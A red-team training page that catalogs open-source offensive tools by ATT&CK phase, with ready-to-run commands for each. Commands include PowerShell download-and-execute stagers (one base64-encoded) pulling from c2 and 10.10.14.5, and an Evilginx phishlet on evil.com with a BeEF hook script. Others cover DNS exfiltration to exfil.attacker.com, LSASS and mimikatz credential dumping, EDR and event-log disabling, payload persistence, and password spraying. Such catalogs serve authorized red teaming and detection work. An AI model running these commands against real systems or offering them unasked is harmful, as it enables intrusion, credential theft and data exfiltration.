---
layout: training-page
title: "Red Teaming Toolkit — OST Catalog — Red Team Academy"
module: "Red Team Tools"
tags:
  - tools
  - toolkit
  - ost
  - att&ck
  - c2
  - payload-development
  - evasion
  - lateral-movement
  - exfiltration
page_key: "tools-red-teaming-toolkit"
render_with_liquid: false
---

# Red Teaming Toolkit — Offensive Security Tool Catalog

Curated catalog of open-source offensive security tools (OST) organized by MITRE ATT&CK phase. Tools are used in adversary simulations and red team operations. The same tools can serve as detection baselines for threat hunters — if you know what adversary tooling looks like, you know what to hunt for.

## Reconnaissance

```
# Fast port scanner — finds open ports in seconds:
# github.com/RustScan/RustScan
rustscan -a 10.10.10.0/24 -- -sV -sC

# In-depth attack surface mapping and asset discovery:
# github.com/OWASP/Amass
amass enum -passive -d target.com
amass enum -active -brute -d target.com

# Secret scanning in git repos (SAST):
# github.com/zricethezav/gitleaks
gitleaks detect --source /path/to/repo

# Open S3 bucket scanner:
# github.com/sa7mon/S3Scanner
s3scanner scan --buckets-file buckets.txt

# Multi-cloud OSINT (AWS, Azure, GCP):
# github.com/initstring/cloud_enum
cloud_enum.py -k targetcompany

# LinkedIn username generation:
# github.com/initstring/linkedin2username
python linkedin2username.py -u "your@email.com" -c "Target Corp"

# Passive Google dorking automation:
# github.com/opsdisk/pagodo
pagodo.py -g dorks.txt -d target.com -l 100

# Recursive OSINT with 100+ modules (SpiderFoot replacement):
# github.com/blacklanternsecurity/bbot
bbot -t target.com -f subdomain-enum email-enum

# Email spoofability check (SPF/DMARC misconfiguration):
# github.com/BishopFox/spoofcheck
python spoofcheck.py target.com

# GitHub pipeline attack surface:
# github.com/praetorian-inc/gato
gato -s enumerate -t target-org
```

## Initial Access

### Password Spraying

```
# O365 / OWA / Lync password spraying with IP rotation:
# github.com/knavesec/CredMaster
python3 credmaster.py --plugin o365 -u users.txt -p 'Winter2024!' --delay 1800

# SprayingToolkit — O365/OWA/Lync:
# github.com/byt3bl33d3r/SprayingToolkit
python3 atomizer.py owa target.com passwords.txt users.txt
```

### Payload Development

```
# ScareCrow — payload creation with EDR bypass:
# github.com/optiv/ScareCrow
ScareCrow -I shellcode.bin -Loader binary -domain microsoft.com

# Donut — shellcode from .NET/EXE/DLL (in-memory execution):
# github.com/TheWover/donut
donut -f input.exe -o shellcode.bin -a 2    # x64

# Freeze — payload toolkit (suspended process, direct syscalls):
# github.com/optiv/Freeze
Freeze -I shellcode.bin -O payload.exe -process "RuntimeBroker.exe"

# ThreatCheck — find bytes that Defender/AMSI flags:
# github.com/rasta-mouse/ThreatCheck
ThreatCheck.exe -f payload.exe -e Defender

# EvilClippy — VBA macro obfuscation / P-Code stomping:
# github.com/outflanknl/EvilClippy
EvilClippy.exe -s fakecode.vba -t 2016x86 malicious.doc

# ProtectMyTooling — daisy-chain packers/obfuscators:
# github.com/mgeeky/ProtectMyTooling
python3 ProtectMyTooling.py hyperion,upx payload.exe output.exe

# macro_pack — Office macro obfuscation and generation:
# github.com/sevagas/macro_pack
echo "IEX(New-Object Net.WebClient).DownloadString('http://c2/a')" | \
  macro_pack.exe -G lure.docm --template=HELLO

# InlineWhispers — direct syscalls in Cobalt Strike BOFs:
# github.com/outflanknl/InlineWhispers
```

## Delivery

### Phishing Infrastructure

```
# Evilginx2 — reverse proxy for credential + session cookie theft:
# github.com/kgretzky/evilginx2
evilginx            # interactive console
: phishlets hostname o365 login.microsoftonline.com.evil.com
: phishlets enable o365
: lures create o365

# Gophish — phishing campaign management platform:
# github.com/gophish/gophish
./gophish           # listen on :3333 (admin) and :80 (phishing)
# Dashboard at https://localhost:3333 (admin/gophish default)

# Modlishka — transparent reverse proxy with phishing:
# github.com/drk1wi/Modlishka
./Modlishka -target https://target.login.page -phishing attacker.domain

# BeEF — browser exploitation framework (watering hole):
# github.com/beefproject/beef
# Hook target browser: <script src="http://attacker/hook.js"></script>
```

## Command and Control

### C2 Frameworks

```
# Sliver — cross-platform C2 (mTLS, HTTP/S, DNS):
# github.com/BishopFox/sliver
sliver-server       # start server
sliver              # client console
generate --mtls attacker.com --os windows --arch amd64 --format exe

# Havoc — modern malleable C2:
# github.com/HavocFramework/Havoc
./havoc server --profile ./profiles/havoc.yaotl
./havoc client

# Mythic — Docker-based extensible C2 with web UI:
# github.com/its-a-feature/Mythic
./install_docker_ubuntu.sh
./mythic-cli start

# Empire 5 — PowerShell/.NET/Python agents:
# github.com/BC-SECURITY/Empire
./ps-empire server
./ps-empire client
(Empire) > uselistener http
(Empire) > usestager windows/launcher_bat

# PoshC2 — proxy-aware C2:
# github.com/nettitude/PoshC2
posh-project -d /opt/posh/project1
posh-server         # start implant handler
posh                # operator console

# NimPlant — lightweight Nim/Python C2:
# github.com/chvancooten/NimPlant
python3 nimplant.py compile exe
python3 nimplant.py server

# Covenant — .NET C2 collaborative platform:
# github.com/cobbr/Covenant
dotnet run --project Covenant/Covenant.csproj
```

### C2 Infrastructure / Staging

```
# Domain Hunter — find expired domains for C2/phishing:
# github.com/threatexpress/domainhunter
python3 domainhunter.py -r 500 -c

# C2concealer — Cobalt Strike malleable profile generator:
# github.com/FortyNorthSecurity/C2concealer
C2concealer --hostname evil.example.com --port 443

# RedWarden — Cobalt Strike malleable redirector:
# github.com/mgeeky/RedWarden
python3 RedWarden.py -c config.yaml

# skyhook — obfuscated HTTP file transfer to bypass IDS:
# github.com/blackhillsinfosec/skyhook
./skyhook server -p 443 -c cert.pem -k key.pem

# GraphStrike — Cobalt Strike C2 over Microsoft Graph API:
# github.com/RedSiege/GraphStrike
```

### Red Team SIEM / Log Aggregation

```
# RedELK — track Blue Team detection of Red Team operations:
# github.com/outflanknl/RedELK
# Monitors CS teamserver logs, correlates with Blue Team alerts
# Alerts when Red Team IOCs are detected by defender

# RedEye — visual analytics for op timeline and path review:
# github.com/cisagov/RedEye
docker compose up
```

## Situational Awareness

### Host Enumeration

```
# Seatbelt — comprehensive host security survey:
# github.com/GhostPack/Seatbelt
Seatbelt.exe -group=all
Seatbelt.exe -group=system TokenPrivileges
Seatbelt.exe AMSIProviders AntiVirus EDRProducts

# SharpEDRChecker — detect AV/EDR products:
# github.com/PwnDexter/SharpEDRChecker
SharpEDRChecker.exe

# CS-Situational-Awareness-BOF — BOF collection for recon:
# github.com/trustedsec/CS-Situational-Awareness-BOF
# In Cobalt Strike: inline-execute sa-whoami.o
# Includes: whoami, ipconfig, netstat, sc_query, reg_query, etc.

# SauronEye — search for files containing keywords:
# github.com/vivami/SauronEye
SauronEye.exe -d \\server\share -f *.txt *.doc -k password secret
```

### Domain / AD Enumeration

```
# BloodHound — AD attack path mapping:
# github.com/BloodHoundAD/BloodHound
# Collect data with SharpHound:
SharpHound.exe -c All --zipfilename loot.zip
# Import zip into BloodHound GUI, run pre-built queries

# Rubeus — Kerberos attack toolkit:
# github.com/GhostPack/Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe ptt /ticket:doIFnjCCBZqgAwIBBaEDAgEWooIEmzCCBJdhggSTMIIEj6ADAgEFoRIbEENPUlAuSU5MQU5FRlJFRUS

# StandIn — AD post-compromise toolkit (.NET):
# github.com/FuzzySecurity/StandIn
StandIn.exe --object samaccountname=krbtgt
StandIn.exe --dacl --target "CN=Users,DC=corp,DC=local"

# PSPKIAudit — AD CS (certificate services) audit:
# github.com/GhostPack/PSPKIAudit
Import-Module PSPKIAudit.psm1; Invoke-PKIAudit
```

## Credential Dumping

```
# Mimikatz — the standard (use reflectively or via BOF):
# github.com/gentilkiwi/mimikatz
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::dcsync /domain:corp.local /user:krbtgt

# Dumpert — LSASS dump via direct syscalls (bypasses hooks):
# github.com/outflanknl/Dumpert
rundll32.exe Outflank-Dumpert.dll,Dump

# nanodump — BOF minidump of LSASS:
# github.com/helpsystems/nanodump
# In CS: inline-execute nanodump.x64.o --write /tmp/dump.dmp

# PPLBlade — dump LSASS with PPL protection bypass:
# github.com/tastypepperoni/PPLBlade
PPLBlade.exe --mode dump --name lsass.exe --handle procexp

# SharpDPAPI — DPAPI decryption (.NET):
# github.com/GhostPack/SharpDPAPI
SharpDPAPI.exe triage          # local machine DPAPI blobs
SharpDPAPI.exe credentials     # Windows credential manager

# LaZagne — retrieve passwords from local apps:
# github.com/AlessandroZ/LaZagne
laZagne.exe all
laZagne.exe browsers -oA -output /tmp/
```

## Privilege Escalation

```
# PEASS-ng — comprehensive Windows/Linux/Mac privesc checks:
# github.com/carlospolop/PEASS-ng
winpeas.exe
linpeas.sh | tee linpeas.out

# SharpUp — Windows local privesc checks:
# github.com/GhostPack/SharpUp
SharpUp.exe audit
SharpUp.exe HijackablePaths AlwaysInstallElevated

# Watson — missing KB / exploit suggester (.NET):
# github.com/rasta-mouse/Watson
Watson.exe

# SweetPotato — SYSTEM via service account impersonation:
# github.com/CCob/SweetPotato
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# GodPotato — SYSTEM via SeImpersonate (IIS/service accounts):
# github.com/BeichenDream/GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# KrbRelayUp — SYSTEM via RBCD in default AD configs:
# github.com/Dec0ne/KrbRelayUp
KrbRelayUp.exe relay -d corp.local -cn ws01$
```

## Defense Evasion

```
# EDRSandBlast — bypass EDR via vulnerable driver (BYOVD):
# github.com/wavestone-cdt/EDRSandblast
EDRSandBlast.exe --userland-unhook --nt-offsets NtOffsets.csv

# RefleXXion — userland hook bypass:
# github.com/hlldz/RefleXXion

# SharpUnhooker — API unhooking for ntdll/kernel32/user32:
# github.com/GetRektBoy724/SharpUnhooker
SharpUnhooker.exe

# Mangle — manipulate PE to avoid static EDR detection:
# github.com/optiv/Mangle
Mangle.exe -I payload.exe -O output.exe -S       # strip symbols
Mangle.exe -I payload.exe -O output.exe -C       # cert spoofing

# EDRSilencer — block EDR reporting via WFP:
# github.com/netero1010/EDRSilencer
EDRSilencer.exe block
EDRSilencer.exe blockalledrs

# EvtMute — filter Windows event log output:
# github.com/bats3c/EvtMute
EvtMute.exe

# Phant0m — kill Windows event log service threads:
# github.com/hlldz/Phant0m
Phant0m.exe

# SigFlip — patch signed PE without breaking signature:
# github.com/med0x2e/SigFlip
SigFlip.exe -i legit_signed.exe -s shellcode.bin -o output.exe
```

## Persistence

```
# SharPersist — Windows persistence toolkit (FireEye):
# github.com/fireeye/SharPersist
SharPersist.exe -t reg -c "C:\payload.exe" -k "HKCU" -v "Update" -m add
SharPersist.exe -t schtask -c "C:\payload.exe" -n "Update" -m add -o daily
SharPersist.exe -t service -c "C:\payload.exe" -n "SvcHost" -m add

# SharpStay — .NET persistence installation:
# github.com/0xthirteen/SharpStay
SharpStay.exe action=ScheduledTask taskname=SvcUpdate command="C:\payload.exe"
SharpStay.exe action=RegistryKey keyname=Update command="C:\payload.exe"

# SharpHide — hidden registry key persistence:
# github.com/outflanknl/SharpHide
SharpHide.exe target="C:\payload.exe"

# ScheduleRunner — advanced scheduled task customization:
# github.com/netero1010/ScheduleRunner
ScheduleRunner.exe /method:create /taskname:Update /trigger:onlogon \
  /program:"C:\payload.exe" /user:SYSTEM /technique:hide

# IIS-Raid — native backdoor module for IIS:
# github.com/0x09AL/IIS-Raid
# Install as IIS module, survives IIS restarts

# SharpEventPersist — persist shellcode in Windows Event Log:
# github.com/improsec/SharpEventPersist
```

## Lateral Movement

```
# CrackMapExec — swiss army knife for network pentesting:
# github.com/byt3bl33d3r/CrackMapExec
cme smb 10.10.10.0/24 -u admin -p 'Pass123' --shares
cme smb 10.10.10.5 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x whoami
cme winrm 10.10.10.5 -u admin -p 'Pass123' -X "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"

# impacket — Python protocol library for lateral movement:
# github.com/SecureAuthCorp/impacket
psexec.py corp.local/admin:'Pass123'@10.10.10.5
wmiexec.py corp.local/admin:'Pass123'@10.10.10.5
secretsdump.py corp.local/admin:'Pass123'@dc01

# SharpRDP — RDP execution via .NET:
# github.com/0xthirteen/SharpRDP
SharpRDP.exe computername=10.10.10.5 username=admin \
  password=Pass123 command="powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA="

# SCShell — fileless lateral movement via ChangeServiceConfigA:
# github.com/Mr-Un1k0d3r/SCShell
SCShell.exe 10.10.10.5 XblAuthManager "C:\Windows\System32\cmd.exe /c payload" domain user pass

# LiquidSnake — fileless lateral movement via WMI + GadgetToJScript:
# github.com/RiccardoAncarani/LiquidSnake
LiquidSnake.exe 10.10.10.5

# Coercer — force Windows auth to arbitrary host (9 methods):
# github.com/p0dalirius/Coercer
python3 Coercer.py -u admin -p Pass123 -d corp.local -l attacker -t dc01

# Responder — LLMNR/mDNS poisoning + NTLM capture:
# github.com/lgandx/Responder
Responder.py -I eth0 -wrf
ntlmrelayx.py -tf targets.txt -smb2support
```

### Tunneling

```
# Chisel — TCP/UDP tunnel over HTTP + SSH:
# github.com/jpillora/chisel
# Server (attacker):
chisel server -p 8080 --reverse
# Client (victim):
chisel client attacker:8080 R:socks    # SOCKS5 on attacker:1080

# ligolo-ng — TUN interface tunneling:
# github.com/nicocha30/ligolo-ng
# Server (attacker):
./proxy -selfcert -laddr 0.0.0.0:11601
# Agent (victim):
./agent -connect attacker:11601 -ignore-cert
# Proxy console: session → start

# frp — fast reverse proxy for NAT traversal:
# github.com/fatedier/frp
# frps.toml: bind_port = 7000
# frpc.toml: server_addr=attacker; type=tcp; local_port=22; remote_port=6022
```

## Exfiltration

```
# SharpExfiltrate — modular exfil over trusted channels:
# github.com/Flangvik/SharpExfiltrate
SharpExfiltrate.exe --channel Dropbox --key TOKEN \
  --filepath C:\Users\admin\Documents\sensitive.xlsx

# DNSExfiltrator — data exfil over DNS requests:
# github.com/Arno0x/DNSExfiltrator
# Server (attacker):
dnsexfiltrator.py -d exfil.attacker.com -p pass
# Client (victim):
dnsexfiltrator.ps1 -i secret.zip -d exfil.attacker.com -p pass

# Egress-Assess — test egress data detection:
# github.com/FortyNorthSecurity/Egress-Assess
python egress-assess.py --client ftp --username user \
  --password pass --ip attacker.com --datatype ssn
```

## Adversary Emulation

```
# Atomic Red Team — MITRE ATT&CK test execution:
# github.com/redcanaryco/atomic-red-team
Install-Module -Name invoke-atomicredteam
Import-Module invoke-atomicredteam

# Run a specific technique (T1059.001 — PowerShell):
Invoke-AtomicTest T1059.001
Invoke-AtomicTest T1059.001 -GetPrereqs   # install prereqs
Invoke-AtomicTest T1059.001 -Cleanup      # cleanup artifacts

# Caldera — automated adversary emulation (MITRE):
# github.com/mitre/caldera
python3 server.py --insecure
# Access UI at http://localhost:8888 (admin/admin)
# Deploy agent, run adversary profile

# Stratus Red Team — cloud-native ATT&CK tests:
# github.com/DataDog/stratus-red-team
stratus list
stratus detonate aws.exfiltration.s3-backdoor-bucket-policy
```

## Cloud Attacks

```
# pacu — AWS exploitation framework:
# github.com/RhinoSecurityLabs/pacu
python3 pacu.py
Pacu > import_keys --all
Pacu > run iam__enum_permissions
Pacu > run s3__download_bucket

# ROADtools — Azure AD exploration:
# github.com/dirkjanm/ROADtools
roadrecon auth -u user@corp.com -p Pass123
roadrecon gather
roadrecon gui

# AADInternals — Azure AD admin toolkit:
# github.com/Gerenios/AADInternals
Import-Module AADInternals
Get-AADIntAccessTokenForAzureCoreManagement | Set-AADIntRoles

# TeamFiltration — O365 AAD spray/exfil/backdoor:
# github.com/Flangvik/TeamFiltration
TeamFiltration.exe --spray --out-dir loot --username-file users.txt \
  --password 'Spring2024!'

# GraphRunner — Microsoft Graph API post-exploitation:
# github.com/dafthack/GraphRunner
Invoke-GraphRunner -Tokens tokens.json
```

## Reporting & Operation Tracking

```
# Ghostwriter — Red Team report management platform:
# github.com/GhostManager/Ghostwriter
# Django web app — manage engagements, findings, reports
docker compose up

# VECTR — track Red/Blue team testing, measure detection:
# github.com/SecurityRiskAdvisors/VECTR
# Map attacks to ATT&CK, track what was detected vs. missed

# RedEye — visual timeline and path analysis:
# github.com/cisagov/RedEye
docker compose up
```

## A-poc RedTeam-Tools — ATT&CK-Aligned Index

The `A-poc/RedTeam-Tools` catalog is organized strictly by the 14 ATT&CK tactics. It's shorter (~115 tools) than infosecn1nja's (~300) but every entry maps cleanly to a tactic, which makes it ideal when you're building an engagement plan technique-by-technique. The table below surfaces entries that are **not already covered in the sections above** — use this as net-new additions rather than duplicates.

| Tactic | Notable tools |
|--------|--------------|
| Reconnaissance | `reconftw` (automated subdomain + vuln chain), `subzy` (subdomain-takeover), `feroxbuster` (Rust forced-browsing), `nuclei` (YAML vuln templates), `smtp-user-enum`, `enum4linux` |
| Resource Development | `remoteInjector` (DOCX remote-template injection), `Chimera` (PS AMSI-bypass obfuscation), `WordSteal` (NTLM via remote image), `OffensiveVBA`, `Alcatraz` (GUI x64 obfuscator) |
| Initial Access | `evilqr`, `SquarePhish` (OAuth device code + QR phish), `EvilGoPhish` (Evilginx+GoPhish), `Bash Bunny`, `King Phisher`, `Social Engineer Toolkit`, `Hydra` |
| Execution | `evil-winrm`, `UltimateAppLockerByPassList`, `PowerSploit` |
| Persistence | `Empire`, `Impacket`, `SharPersist`, `ligolo-ng` |
| Privilege Escalation | `Crassus` (DLL hijack + ACL finder), `BeRoot`, `linux-smart-enumeration`, `Get-GPPPassword`, `Sherlock`, `ImpulsiveDLLHijack` |
| Defense Evasion | `AMSI Fail` (catalog of one-liner bypasses), `moonwalk` (Linux log/timestamp wipe), `Alcatraz`, `Mangle` |
| Credential Access | `dploot` (Linux Python DPAPI), `SCOMDecrypt`, `MailSniper`, `eviltree` |
| Discovery | `PCredz` (cred extraction from PCAP + live), `PingCastle`, `adidnsdump`, `scavenger` |
| Lateral Movement | `WMIOps`, `PowerLessShell` (remote PS without powershell.exe), `LiquidSnake` (fileless lateral) |
| Collection | `Snaffler` (AD share sensitive-data finder), `linWinPwn` (combined AD enum + vuln) |
| C2 | `NimPlant` (Nim C2), `Hoaxshell` (PS reverse shell), `Living Off Trusted Sites` |
| Exfiltration | `Dnscat2`, `Cloakify`, `PyExfil`, `GD-Thief` (Google Drive), `goshs` (multi-protocol server) |
| Impact | `Conti Pentester Guide Leak`, `usbkill`, `Keytap` (acoustic keylogging) |

### Pointers you will actually use

- **Snaffler** — walks AD shares looking for `*.config` / `*.ps1` / password-pattern files. Faster than manual grep once you have a foothold.
- **reconftw** — bash pipeline that combines subfinder/amass/nuclei/dalfox into a single kickoff — good for initial external recon day.
- **AMSI Fail** — living list of one-line PowerShell AMSI bypasses. Not novel tech, but a quick lookup when you need something to drop in a stager right now.
- **NimPlant** — Nim C2 worth evaluating for novel-runtime engagements (EDRs are less trained on Nim binaries than on C#/Go).
- **ligolo-ng** — TUN-based tunneling without SOCKS. Already has its own page in Pivoting — see `pivoting/ligolo-ng.md`.
- **dploot** — Python implementation of SharpDPAPI for engagements where shipping a Windows binary is noisier than running Python from Linux.

## Resources

- infosecn1nja Red-Teaming-Toolkit — `github.com/infosecn1nja/Red-Teaming-Toolkit`
- A-poc RedTeam-Tools — `github.com/A-poc/RedTeam-Tools`
- MITRE ATT&CK Framework — `attack.mitre.org`
- Tidal Cyber (ATT&CK-aligned threat modeling) — `app.tidalcyber.com`
- Living Off The Land Drivers — `loldrivers.io`
- LOLBAS — `lolbas-project.github.io`
- GTFOBins — `gtfobins.github.io`
- HijackLibs — `hijacklibs.net`
- LOTS (Living Off Trusted Sites) — `lots-project.com`
- LOOBins (macOS) — `loobins.io`
- Related: [LOLBAS Reference](/evasion/lolbas-reference/)
- Related: [C2 Frameworks](/c2-frameworks/)
